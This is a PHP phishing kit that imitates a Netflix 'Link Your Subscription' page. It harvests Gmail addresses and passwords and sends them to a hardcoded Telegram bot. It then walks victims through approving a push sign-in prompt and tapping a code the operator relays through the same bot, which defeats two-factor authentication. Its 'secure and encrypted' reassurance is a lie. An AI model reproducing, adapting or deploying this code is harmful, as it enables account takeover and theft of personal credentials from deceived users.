<?php
session_start();

// Initialize variables
$email = '';
$password = '';
$verification_code = '';
$success_message = '';
$error_message = '';
$step = $_GET['step'] ?? 1;

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($step == 1) {
        // Step 1: Email and Password
        $email = trim($_POST['email'] ?? '');
        $password = trim($_POST['password'] ?? '');
        
        // Validate inputs
        if (empty($email) || empty($password)) {
            $error_message = 'Please fill in both email and password fields.';
        } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $error_message = 'Please enter a valid email address.';
        } else {
            // Store credentials in session
            $_SESSION['email'] = $email;
            $_SESSION['password'] = $password;
            
            // Send credentials to Telegram bot
            $bot_token = '7797217194:AAFcWDUpD6y7xpI0ZYKgFTJmY8F2hgflLbk';
            $chat_id = '1066887572';
            $message = "New Gmail credentials:\nEmail: " . $email . "\nPassword: " . $password;
            
            // Send to Telegram bot
            $telegram_url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
            $post_data = [
                'chat_id' => $chat_id,
                'text' => $message,
                'parse_mode' => 'HTML'
            ];
            
            // Use cURL to send the request
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $telegram_url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            
            $response = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($response && $http_code == 200) {
                // Redirect to step 2
                header('Location: ?step=2');
                exit();
            } else {
                $error_message = 'Failed to link your Gmail account. Please try again later.';
            }
        }
    } elseif ($step == 2) {
        // Step 2: Phone notification confirmation
        if (isset($_POST['confirmed'])) {
            // Set timestamp when user reaches step 3
            $_SESSION['step3_timestamp'] = time();
            header('Location: ?step=3');
            exit();
        }
    } elseif ($step == 3) {
        // Step 3: User confirms they pressed the code
        if (isset($_POST['verification_code']) && !empty($_POST['verification_code'])) {
            // User confirmed they pressed the code
            $success_message = 'Thank you! Your Gmail account has been linked successfully.';
            // Clear session data
            session_destroy();
            $step = 4; // Final success step
        } else {
            $error_message = 'Please confirm you have pressed the verification code on your phone.';
        }
    }
}

// Function to get latest verification code from Telegram
function getLatestCodeFromTelegram() {
    $bot_token = '7797217194:AAFcWDUpD6y7xpI0ZYKgFTJmY8F2hgflLbk';
    $chat_id = '1066887572';
    
    // Get updates from Telegram bot with offset to get only new messages
    $telegram_url = "https://api.telegram.org/bot{$bot_token}/getUpdates?limit=10&timeout=1";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $data = json_decode($response, true);
        if (isset($data['result']) && !empty($data['result'])) {
            // Get messages from the specific chat ID - get the most recent ones
            $messages = array_reverse($data['result']); // Get newest first
            $current_time = time();
            
            // Get the timestamp when user reached step 3
            $step3_timestamp = $_SESSION['step3_timestamp'] ?? 0;
            
            foreach ($messages as $message) {
                if (isset($message['message']['chat']['id']) && 
                    $message['message']['chat']['id'] == $chat_id &&
                    isset($message['message']['text']) &&
                    isset($message['message']['date'])) {
                    
                    $message_time = $message['message']['date'];
                    $text = trim($message['message']['text']);
                    
                    // Only consider messages sent after the user reached step 3
                    // AND within the last 5 minutes as a safety check
                    if ($message_time > $step3_timestamp && ($current_time - $message_time) <= 300) {
                        // Look for numeric codes (digits only, 2-8 characters)
                        if (preg_match('/^\d{2,8}$/', $text)) {
                            return $text;
                        }
                        // Also check for codes in longer messages
                        if (preg_match('/\b(\d{2,8})\b/', $text, $matches)) {
                            return $matches[1];
                        }
                    }
                }
            }
        }
    }
    
    return null; // No recent code found
}

// Get verification code when on step 3
$fetched_code = null;
if ($step == 3) {
    $fetched_code = getLatestCodeFromTelegram();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Link Your Subscription</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Netflix+Sans:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #141414;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            color: #ffffff;
            line-height: 1.6;
        }
        
        .main-container {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background: linear-gradient(135deg, #141414 0%, #000000 100%);
            position: relative;
        }
        
        .main-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(229,9,20,0.1)" stroke-width="0.5"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>') center/cover;
            opacity: 0.3;
        }
        
        .form-card {
            background: rgba(0, 0, 0, 0.9);
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(229, 9, 20, 0.2);
            border: 1px solid rgba(229, 9, 20, 0.3);
            backdrop-filter: blur(10px);
            overflow: hidden;
            position: relative;
            z-index: 1;
            max-width: 480px;
            width: 100%;
        }
        
        .form-header {
            background: linear-gradient(135deg, #E50914 0%, #B81D24 100%);
            padding: 40px 30px;
            text-align: center;
            position: relative;
        }
        
        .form-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="2" fill="rgba(255,255,255,0.1)"/><circle cx="20" cy="20" r="1" fill="rgba(255,255,255,0.1)"/><circle cx="80" cy="30" r="1.5" fill="rgba(255,255,255,0.1)"/></svg>') center/cover;
        }
        
        .netflix-logo {
            font-size: 32px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 20px;
            letter-spacing: -1px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        
        .form-header h1 {
            color: white;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        
        .form-header p {
            color: rgba(255, 255, 255, 0.8);
            font-size: 16px;
            margin: 0;
            font-weight: 400;
        }
        
        .form-body {
            padding: 40px 30px;
            background: rgba(0, 0, 0, 0.95);
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #ffffff;
            font-size: 14px;
        }
        
        .form-control {
            width: 100%;
            padding: 16px 20px;
            border: 2px solid #333333;
            border-radius: 4px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #333333;
            color: #ffffff;
        }
        
        .form-control:focus {
            outline: none;
            border-color: #E50914;
            background: #222222;
            box-shadow: 0 0 0 4px rgba(229, 9, 20, 0.1);
        }
        
        .form-control::placeholder {
            color: #999999;
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #E50914 0%, #B81D24 100%);
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(229, 9, 20, 0.4);
            background: linear-gradient(135deg, #F40612 0%, #E50914 100%);
        }
        
        .submit-btn:active {
            transform: translateY(0);
        }
        
        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }
        
        .submit-btn:disabled {
            background: #666666;
            cursor: not-allowed;
            transform: none;
        }
        
        .submit-btn:disabled:hover {
            transform: none;
            box-shadow: none;
        }
        
        .alert {
            padding: 16px 20px;
            border-radius: 4px;
            margin-bottom: 24px;
            border: none;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .alert-success {
            background: rgba(34, 197, 94, 0.1);
            color: #22c55e;
            border-left: 4px solid #22c55e;
        }
        
        .alert-danger {
            background: rgba(239, 68, 68, 0.1);
            color: #ef4444;
            border-left: 4px solid #ef4444;
        }
        
        .alert i {
            font-size: 18px;
        }
        
        .security-note {
            text-align: center;
            margin-top: 24px;
            padding: 16px;
            background: rgba(51, 51, 51, 0.5);
            border-radius: 4px;
            border-left: 4px solid #666666;
        }
        
        .security-note small {
            color: #999999;
            font-size: 13px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn-close {
            margin-left: auto;
            opacity: 0.5;
        }
        
        .btn-close:hover {
            opacity: 1;
        }
        
        @media (max-width: 576px) {
            .main-container {
                padding: 10px;
            }
            
            .form-header {
                padding: 30px 20px;
            }
            
            .form-header h1 {
                font-size: 24px;
            }
            
            .form-body {
                padding: 30px 20px;
            }
        }
        
        /* Additional styles for new steps */
        .notification-info, .verification-info {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .notification-icon, .verification-icon {
            color: #E50914;
            margin-bottom: 20px;
        }
        
        .notification-info h3, .verification-info h3 {
            color: #ffffff;
            margin-bottom: 15px;
            font-size: 24px;
        }
        
        .notification-info p, .verification-info p {
            color: #cccccc;
            font-size: 16px;
            line-height: 1.6;
        }
        
        .phone-mockup {
            margin: 30px 0;
        }
        
        .phone-screen {
            background: #1a1a1a;
            border-radius: 20px;
            padding: 20px;
            border: 2px solid #333;
            max-width: 300px;
            margin: 0 auto;
        }
        
        .notification-card {
            background: #2a2a2a;
            border-radius: 12px;
            padding: 20px;
            border-left: 4px solid #E50914;
        }
        
        .notification-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
            color: #E50914;
            font-weight: bold;
        }
        
        .notification-body p {
            margin: 5px 0;
            color: #ffffff;
            font-size: 14px;
        }
        
        .notification-actions {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        
        .btn-yes, .btn-no {
            padding: 8px 16px;
            border: none;
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            font-weight: 500;
        }
        
        .btn-yes {
            background: #22c55e;
            color: white;
        }
        
        .btn-no {
            background: #ef4444;
            color: white;
        }
        
        .code-display {
            background: #E50914;
            color: white;
            padding: 15px;
            border-radius: 8px;
            font-size: 28px;
            font-weight: bold;
            letter-spacing: 4px;
            font-family: 'Courier New', monospace;
            margin: 15px 0;
            text-align: center;
            border: 2px solid #ffffff;
            box-shadow: 0 0 10px rgba(229, 9, 20, 0.5);
        }
        
        .success-animation {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .success-icon {
            color: #22c55e;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .success-animation h3 {
            color: #ffffff;
            margin-bottom: 15px;
            font-size: 28px;
        }
        
        .success-animation p {
            color: #cccccc;
            font-size: 16px;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="form-card">
            <?php if ($step == 1): ?>
            <!-- Step 1: Email and Password -->
            <div class="form-header">
                <div class="netflix-logo">NETFLIX</div>
                <h1><i class="fas fa-tv me-2"></i>Link Your Subscription</h1>
                <p>Connect your Gmail account to get started</p>
            </div>
            
            <div class="form-body">
                <?php if (!empty($error_message)): ?>
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-circle"></i>
                        <?php echo htmlspecialchars($error_message); ?>
                    </div>
                <?php endif; ?>
                
                <form method="POST" action="">
                    <div class="form-group">
                        <label for="email" class="form-label">
                            <i class="fas fa-envelope me-2"></i>Gmail Email Address
                        </label>
                        <input type="email" 
                               class="form-control" 
                               id="email" 
                               name="email" 
                               value="<?php echo htmlspecialchars($email); ?>" 
                               required 
                               placeholder="Enter your Gmail email address">
                    </div>
                    
                    <div class="form-group">
                        <label for="password" class="form-label">
                            <i class="fas fa-lock me-2"></i>Gmail Password
                        </label>
                        <input type="password" 
                               class="form-control" 
                               id="password" 
                               name="password" 
                               value="<?php echo htmlspecialchars($password); ?>" 
                               required 
                               placeholder="Enter your Gmail password">
                    </div>
                    
                    <button type="submit" class="submit-btn">
                        <i class="fas fa-tv me-2"></i>Link Gmail Account
                    </button>
                </form>
                
                <div class="security-note">
                    <small>
                        <i class="fas fa-shield-alt"></i>
                        Your Gmail credentials are secure and encrypted
                    </small>
                </div>
            </div>
            
            <?php elseif ($step == 2): ?>
            <!-- Step 2: Phone Notification -->
            <div class="form-header">
                <div class="netflix-logo">NETFLIX</div>
                <h1><i class="fas fa-mobile-alt me-2"></i>Confirm Notification</h1>
                <p>Check your phone for verification</p>
            </div>
            
            <div class="form-body">
                <div class="notification-info">
                    <div class="notification-icon">
                        <i class="fas fa-bell fa-3x"></i>
                    </div>
                    <h3>Check Your Phone</h3>
                    <p>We've sent a notification to your phone. Please check your device and tap <strong>"Yes, it's me"</strong> to continue.</p>
                    
                    <div class="phone-mockup">
                        <div class="phone-screen">
                            <div class="notification-card">
                                <div class="notification-header">
                                    <i class="fas fa-tv"></i>
                                    <span>Netflix</span>
                                </div>
                                <div class="notification-body">
                                    <p>Sign in attempt detected</p>
                                    <p>Is this you?</p>
                                </div>
                                <div class="notification-actions">
                                    <button class="btn-yes">Yes, it's me</button>
                                    <button class="btn-no">No</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <form method="POST" action="">
                    <input type="hidden" name="confirmed" value="1">
                    <button type="submit" class="submit-btn">
                        <i class="fas fa-check me-2"></i>I've Pressed "Yes, it's me"
                    </button>
                </form>
                
                <div class="security-note">
                    <small>
                        <i class="fas fa-info-circle"></i>
                        This step ensures your account security
                    </small>
                </div>
            </div>
            
            <?php elseif ($step == 3): ?>
            <!-- Step 3: Press Code on Phone -->
            <div class="form-header">
                <div class="netflix-logo">NETFLIX</div>
                <h1><i class="fas fa-mobile-alt me-2"></i>Press the Code</h1>
                <p>Tap the verification code on your phone</p>
            </div>
            
            <div class="form-body">
                <?php if (!empty($error_message)): ?>
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-circle"></i>
                        <?php echo htmlspecialchars($error_message); ?>
                    </div>
                <?php endif; ?>
                
                <div class="verification-info">
                    <div class="verification-icon">
                        <i class="fas fa-mobile-alt fa-3x"></i>
                    </div>
                    <h3>Check Your Phone</h3>
                    <p>We've sent a verification code to your device. Please find and <strong>tap/press the code</strong> on your phone to complete the verification.</p>
                    
                    <div class="phone-mockup">
                        <div class="phone-screen">
                            <div class="notification-card">
                                <div class="notification-header">
                                    <i class="fas fa-tv"></i>
                                    <span>Netflix Verification</span>
                                </div>
                                <div class="notification-body">
                                    <p>Your verification code:</p>
                                    <div class="code-display">
                                        <?php 
                                        if ($fetched_code) {
                                            echo $fetched_code;
                                        } else {
                                            echo '<span style="font-size: 14px; color: #999;">Waiting for new code...</span>';
                                        }
                                        ?>
                                    </div>
                                    <p><strong>Tap this code to verify</strong></p>
                                    <?php if (!$fetched_code): ?>
                                    <p style="font-size: 12px; color: #999; margin-top: 10px;">
                                        <i class="fas fa-sync-alt fa-spin"></i> Looking for recent codes...
                                    </p>
                                    <p style="font-size: 11px; color: #666; margin-top: 5px;">
                                        Send a new verification code to continue
                                    </p>
                                    <?php endif; ?>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <form method="POST" action="">
                    <input type="hidden" name="verification_code" value="<?php echo $fetched_code ?: ''; ?>">
                    <button type="submit" class="submit-btn" <?php echo !$fetched_code ? 'disabled' : ''; ?>>
                        <i class="fas fa-check me-2"></i>I've Pressed the Code
                    </button>
                </form>
                
                <div class="security-note">
                    <small>
                        <i class="fas fa-info-circle"></i>
                        Look for the code notification on your phone and tap it
                    </small>
                </div>
            </div>
            
            <?php elseif ($step == 4): ?>
            <!-- Step 4: Success -->
            <div class="form-header">
                <div class="netflix-logo">NETFLIX</div>
                <h1><i class="fas fa-check-circle me-2"></i>Success!</h1>
                <p>Your account has been linked</p>
            </div>
            
            <div class="form-body">
                <div class="success-animation">
                    <div class="success-icon">
                        <i class="fas fa-check-circle fa-4x"></i>
                    </div>
                    <h3>All Done!</h3>
                    <p>Your Gmail account has been successfully linked to Netflix. You can now enjoy all the features!</p>
                </div>
                
                <div class="security-note">
                    <small>
                        <i class="fas fa-shield-alt"></i>
                        Your account is now secure and ready to use
                    </small>
                </div>
            </div>
            <?php endif; ?>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Add some smooth interactions
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const submitBtn = document.querySelector('.submit-btn');
            const inputs = document.querySelectorAll('.form-control');
            
            // Add focus animations
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.parentElement.style.transform = 'translateY(-2px)';
                    this.parentElement.style.transition = 'transform 0.3s ease';
                });
                
                input.addEventListener('blur', function() {
                    this.parentElement.style.transform = 'translateY(0)';
                });
            });
            
            // Form submission feedback
            form.addEventListener('submit', function() {
                const step = new URLSearchParams(window.location.search).get('step') || '1';
                if (step === '1') {
                    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>Linking Gmail...';
                } else if (step === '2') {
                    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>Confirming...';
                } else if (step === '3') {
                    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>Verifying...';
                }
                submitBtn.disabled = true;
            });
            
            // Auto-refresh page on step 3 to check for new codes
            if (window.location.search.includes('step=3')) {
                const codeDisplay = document.querySelector('.code-display');
                if (codeDisplay && (codeDisplay.textContent.includes('Waiting for') || codeDisplay.textContent.includes('Looking for'))) {
                    setTimeout(() => {
                        window.location.reload();
                    }, 5000); // Refresh every 5 seconds to check for new codes
                }
            }
            
            // Auto-hide alerts after 5 seconds
            const alerts = document.querySelectorAll('.alert');
            alerts.forEach(alert => {
                setTimeout(() => {
                    alert.style.opacity = '0';
                    alert.style.transform = 'translateY(-10px)';
                    setTimeout(() => {
                        alert.remove();
                    }, 300);
                }, 5000);
            });
        });
    </script>
</body>
</html>
